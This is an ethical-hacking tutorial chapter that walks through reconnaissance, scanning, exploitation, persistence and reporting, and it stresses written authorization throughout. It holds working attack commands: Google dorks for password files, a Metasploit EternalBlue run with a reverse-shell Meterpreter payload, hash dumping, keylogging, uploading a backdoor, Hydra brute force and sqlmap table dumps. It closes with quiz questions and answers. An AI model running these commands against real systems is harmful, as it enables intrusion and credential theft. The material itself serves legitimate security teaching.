# 09. Ethical Hacking Process

## Table of Contents
- [9.1 What is Ethical Hacking?](#91-what-is-ethical-hacking)
- [9.2 Phase 1 — Reconnaissance](#92-phase-1--reconnaissance)
- [9.3 Phase 2 — Scanning & Enumeration](#93-phase-2--scanning--enumeration)
- [9.4 Phase 3 — Gaining Access](#94-phase-3--gaining-access)
- [9.5 Phase 4 — Maintaining Access](#95-phase-4--maintaining-access)
- [9.6 Phase 5 — Covering Tracks & Reporting](#96-phase-5--covering-tracks--reporting)
- [9.7 Legal & Ethical Considerations](#97-legal--ethical-considerations)
- [9.8 Common Mistakes & Interview Tips](#98-common-mistakes--interview-tips)
- [9.9 Practice & Assessment](#99-practice--assessment)

---

## 9.1 What is Ethical Hacking?

### Definition
**Ethical hacking** (penetration testing) is the authorized practice of testing systems for security vulnerabilities using the same techniques as malicious hackers — but with **written permission** and the goal of **improving security**.

### The Five Phases

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   Phase 1    │    │   Phase 2    │    │   Phase 3    │
│ Reconnaissance│──►│  Scanning &  │──►│   Gaining    │
│ (Information │    │ Enumeration  │    │   Access     │
│  Gathering)  │    │              │    │              │
└──────────────┘    └──────────────┘    └──────┬───────┘
                                               │
                                               ▼
                    ┌──────────────┐    ┌──────────────┐
                    │   Phase 5    │    │   Phase 4    │
                    │  Covering    │◄───│ Maintaining  │
                    │  Tracks &    │    │   Access     │
                    │  Reporting   │    │              │
                    └──────────────┘    └──────────────┘
```

---

## 9.2 Phase 1 — Reconnaissance

### Definition
Gathering information about the target **without directly interacting** with it (passive) or **with direct interaction** (active).

### Passive Reconnaissance (No direct contact with target)

| Technique | Tool/Method | Information Gained |
|-----------|------------|-------------------|
| OSINT | Google, social media | Employee names, emails, tech stack |
| Google Dorking | Advanced Google searches | Exposed files, login pages, configs |
| WHOIS Lookup | `whois domain.com` | Domain owner, registrar, DNS servers |
| DNS Records | `dig`, `nslookup` | Subdomains, mail servers, IP ranges |
| Shodan | shodan.io | Exposed services, IoT devices |
| theHarvester | CLI tool | Emails, names, subdomains |
| Wayback Machine | web.archive.org | Old versions of website |

### Google Dorking (Advanced Search Operators)

```
site:target.com                    → Pages on target domain
site:target.com filetype:pdf       → PDF files on the site
site:target.com inurl:admin        → Admin pages
site:target.com inurl:login        → Login pages
site:target.com ext:sql            → SQL database dumps
"index of" site:target.com        → Directory listings
intitle:"phpMyAdmin" site:target.com → Database admin panels
inurl:wp-admin site:target.com    → WordPress admin
"password" filetype:txt site:target.com → Password files!
```

### Active Reconnaissance (Direct interaction with target)

```bash
# Ping — Is the host alive?
ping -c 4 target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
host -t ns target.com

# WHOIS lookup
whois target.com

# Subdomain enumeration
subfinder -d target.com
amass enum -passive -d target.com

# theHarvester — Gather emails, names, subdomains
theHarvester -d target.com -b google,linkedin -l 200
```

---

## 9.3 Phase 2 — Scanning & Enumeration

### Definition
Actively probing the target to discover open ports, running services, operating systems, and vulnerabilities.

### Port Scanning with Nmap

```bash
# ═══════════════════════════════════════
# HOST DISCOVERY
# ═══════════════════════════════════════
# Ping sweep (find live hosts)
nmap -sn 192.168.1.0/24

# ═══════════════════════════════════════
# PORT SCANNING
# ═══════════════════════════════════════
# TCP SYN scan (default, stealthy)
sudo nmap -sS 192.168.1.100

# TCP connect scan (no root needed)
nmap -sT 192.168.1.100

# UDP scan
sudo nmap -sU 192.168.1.100

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.100

# Scan all 65535 ports
nmap -p- 192.168.1.100

# Top 100 ports (fast)
nmap --top-ports 100 192.168.1.100

# ═══════════════════════════════════════
# SERVICE & VERSION DETECTION
# ═══════════════════════════════════════
# Service version detection
nmap -sV 192.168.1.100

# OS detection
sudo nmap -O 192.168.1.100

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.100

# ═══════════════════════════════════════
# NSE SCRIPTS (Nmap Scripting Engine)
# ═══════════════════════════════════════
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Check for specific vulnerability
nmap --script smb-vuln-ms17-010 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# Banner grabbing
nmap --script banner 192.168.1.100
```

### Sample Nmap Output

```
Nmap scan report for 192.168.1.100
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1
80/tcp   open  http        Apache httpd 2.4.38
443/tcp  open  ssl/http    Apache httpd 2.4.38
3306/tcp open  mysql       MySQL 5.7.33
8080/tcp open  http-proxy  —

Analysis:
  • SSH on port 22 — check for weak passwords
  • Apache 2.4.38 — check for known CVEs
  • MySQL exposed on 3306 — should NOT be public!
  • Port 8080 — might be admin panel or dev server
```

### Vulnerability Scanning

```bash
# Nmap vulnerability scripts
nmap --script vuln 192.168.1.100

# Nikto (web server vulnerabilities)
nikto -h http://192.168.1.100

# OpenVAS (full vulnerability scanner — GUI)
# Access at https://localhost:9392 after setup

# Nessus (commercial, free for home use)
# Download from tenable.com
```

### Enumeration

```bash
# SMB Enumeration (Windows shares)
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100/ -N

# SNMP Enumeration
snmpwalk -v2c -c public 192.168.1.100

# LDAP Enumeration
ldapsearch -x -H ldap://192.168.1.100 -b "dc=target,dc=com"

# Web directory enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
```

---

## 9.4 Phase 3 — Gaining Access

### Definition
Exploiting discovered vulnerabilities to gain unauthorized access to the target system.

### Exploitation with Metasploit

```bash
# Start Metasploit
msfconsole

# Search for an exploit
msf6> search eternalblue
msf6> search type:exploit platform:windows smb

# Use an exploit
msf6> use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6> show options

# Set target
msf6> set RHOSTS 192.168.1.100
msf6> set LHOST 192.168.1.50       # Your IP (attacker)
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Execute
msf6> exploit

# If successful, you get a Meterpreter session:
meterpreter> sysinfo               # System information
meterpreter> getuid                 # Current user
meterpreter> hashdump               # Dump password hashes
meterpreter> shell                  # Drop to system shell
```

### Password Attacks

```bash
# Hydra — Online brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Medusa — Similar to Hydra
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# John the Ripper — Offline hash cracking
john --wordlist=rockyou.txt hashes.txt

# Hashcat — GPU-accelerated cracking
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

### Web Application Exploitation

```bash
# SQLMap — Automated SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Burp Suite — Manual web testing
# 1. Configure browser proxy → 127.0.0.1:8080
# 2. Browse target, capture requests
# 3. Send to Repeater → modify and resend
# 4. Send to Intruder → automated parameter fuzzing
```

---

## 9.5 Phase 4 — Maintaining Access

### Definition
After gaining access, establishing **persistent** access so you can return even if the initial vulnerability is patched.

### Techniques (For Understanding — Used in Authorized Testing)

```
Backdoors:
  • Reverse shell — Target connects back to attacker
  • Web shell — Malicious script on web server
  • Bind shell — Opens a port on target

Persistence:
  • Create new user account
  • Add SSH key to authorized_keys
  • Scheduled task / cron job
  • Registry run key (Windows)
  • Modify startup scripts

Privilege Escalation:
  • Linux: SUID binaries, kernel exploits, sudo misconfig
  • Windows: Unquoted service paths, token impersonation
```

### Meterpreter Post-Exploitation

```bash
# Inside a Meterpreter session:
meterpreter> getsystem                # Attempt privilege escalation
meterpreter> hashdump                  # Dump password hashes
meterpreter> keyscan_start            # Start keylogger
meterpreter> keyscan_dump             # Read captured keys
meterpreter> screenshot               # Take screenshot
meterpreter> download C:\\secret.txt  # Download file
meterpreter> upload backdoor.exe C:\\ # Upload file
meterpreter> run persistence -h       # Setup persistence
```

---

## 9.6 Phase 5 — Covering Tracks & Reporting

### Covering Tracks (Understanding for Defense)
Attackers try to hide their activity. Defenders need to know what to look for:

```
What attackers clear:
  • Log files (auth.log, event logs, web logs)
  • Shell history (.bash_history)
  • Timestamps (timestomping)
  • Created files and accounts

Detection:
  ✓ Centralized logging (SIEM) — logs copied off-system
  ✓ File integrity monitoring (AIDE, OSSEC)
  ✓ Monitor for Event ID 1102 (Windows log cleared)
  ✓ Immutable logging (write-once storage)
```

### Reporting (The Most Important Part!)

A penetration test is **useless** without a clear report.

```
Professional Pentest Report Structure:
─────────────────────────────────────
1. Executive Summary
   → Non-technical overview for management
   → Key risks in business terms

2. Scope & Methodology
   → What was tested
   → Tools and techniques used
   → Dates and rules of engagement

3. Findings (per vulnerability)
   → Title and severity (Critical/High/Medium/Low)
   → Description of the vulnerability
   → Steps to reproduce (with screenshots)
   → Evidence (hashes, screenshots, data samples)
   → Impact assessment
   → Remediation recommendation

4. Risk Rating Summary
   ┌────────────┬───────┐
   │ Critical   │   2   │
   │ High       │   5   │
   │ Medium     │   8   │
   │ Low        │   3   │
   │ Info       │  12   │
   └────────────┴───────┘

5. Remediation Roadmap
   → Prioritized fix plan
   → Quick wins vs long-term improvements
```

---

## 9.7 Legal & Ethical Considerations

### Rules of Engagement

```
BEFORE any testing, you MUST have:

✅ Written authorization (scope document / contract)
✅ Clearly defined scope (which systems/IPs to test)
✅ Testing window (dates and times)
✅ Emergency contacts (who to call if something breaks)
✅ Rules (what's off-limits: DoS, production data, etc.)
✅ Data handling (how to handle any sensitive data found)

WITHOUT authorization = CRIMINAL OFFENSE
  → Computer Fraud and Abuse Act (US)
  → IT Act 2000/2008 (India)
  → Computer Misuse Act (UK)
```

### Types of Penetration Tests

| Type | Knowledge Given | Simulates |
|------|----------------|-----------|
| **Black Box** | No info about target | External attacker |
| **White Box** | Full info (code, architecture, credentials) | Insider / code review |
| **Grey Box** | Partial info (some credentials, network map) | Employee with limited access |

---

## 9.8 Common Mistakes & Interview Tips

### Common Mistakes

| Mistake | Consequence |
|---------|------------|
| Testing without written permission | Jail time |
| Not documenting findings | Report is incomplete |
| Skipping reconnaissance | Miss critical attack vectors |
| Only using automated tools | Miss logic flaws |
| Not verifying findings manually | False positives in report |

### Interview Questions

**Q: What are the five phases of ethical hacking?**
> 1) Reconnaissance, 2) Scanning & Enumeration, 3) Gaining Access, 4) Maintaining Access, 5) Covering Tracks / Reporting.

**Q: What is the difference between black box and white box testing?**
> Black box: tester has no prior knowledge (simulates external attacker). White box: tester has full knowledge of the system (code, architecture). Grey box: partial knowledge.

**Q: Why is reporting the most important phase?**
> Without a clear, actionable report, vulnerabilities won't be fixed. The report translates technical findings into business risk so management can prioritize remediation.

**Q: What is the difference between a vulnerability assessment and a penetration test?**
> Vulnerability assessment identifies and lists vulnerabilities (scanning). Penetration testing goes further — it actually exploits vulnerabilities to prove impact and assess real-world risk.

---

## 9.9 Practice & Assessment

### MCQs

**Q1.** The first phase of ethical hacking is:
- A) Scanning
- B) Exploitation
- C) Reconnaissance
- D) Reporting

**Answer:** C) Reconnaissance

---

**Q2.** Google Dorking is a form of:
- A) Active reconnaissance
- B) Passive reconnaissance
- C) Exploitation
- D) Post-exploitation

**Answer:** B) Passive reconnaissance

---

**Q3.** `nmap -sV` is used for:
- A) OS detection
- B) Service version detection
- C) Vulnerability scanning
- D) Stealth scanning

**Answer:** B) Service version detection

---

**Q4.** A black box penetration test means:
- A) Tester has full system knowledge
- B) Tester has no prior knowledge of the target
- C) Testing is done at night
- D) Only automated tools are used

**Answer:** B) Tester has no prior knowledge of the target

---

**Q5.** The most important phase of penetration testing is:
- A) Exploitation
- B) Scanning
- C) Reporting
- D) Reconnaissance

**Answer:** C) Reporting (findings are useless without a clear report)

---

### Scenario-Based Questions

**Scenario:** You are hired to test a company's website. During reconnaissance, you find the company's GitHub repository is public and contains database credentials in a configuration file. What do you do?
> Document the finding immediately. Report it as a Critical severity issue. Recommend removing the credentials from the repo, rotating all exposed credentials, and using environment variables or a secrets manager instead.

---

> **Next Topic:** [10 - Security Tools](10-security-tools.md)
